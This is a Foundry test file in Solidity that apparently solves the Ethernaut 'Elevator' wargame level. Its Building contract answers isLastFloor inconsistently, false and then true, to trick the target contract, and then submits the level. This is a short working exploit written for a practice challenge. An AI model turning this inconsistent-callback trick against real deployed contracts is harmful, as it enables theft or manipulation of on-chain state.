// SPDX-License-Identifier: MIT
pragma solidity >=0.8.0;

import "forge-std/Test.sol";
import "../utils.sol";

interface IElevator {
  function goTo(uint _floor) external;
}

contract Building {
  IElevator internal elevator;
  bool flag;

  constructor(address _elevatorAddress) {
    elevator = IElevator(_elevatorAddress);
  }

  // we won't name this one "attack"
  function solveChallenge() external {
    // we call this function, this function calls
    // isLastFloor() below.
    elevator.goTo(0);
  }

  // this function needs to answers _false_ the first time,
  // and then _true_ the second one.
  function isLastFloor(uint256) external returns (bool) {
    if (!flag) {
      flag = true;
      return false;
    } else {
      return true;
    }
  }
}

contract ElevatorTest is Test {
  address internal challengeAddress;
  Building internal building;

  function setUp() public {
    challengeAddress = utils.createLevelInstance(0xaB4F3F2644060b2D960b0d88F0a42d1D27484687);
    building = new Building(challengeAddress);
  }

  function testExploit() public {
    building.solveChallenge();

    utils.submitLevelInstance(challengeAddress);
  }
}
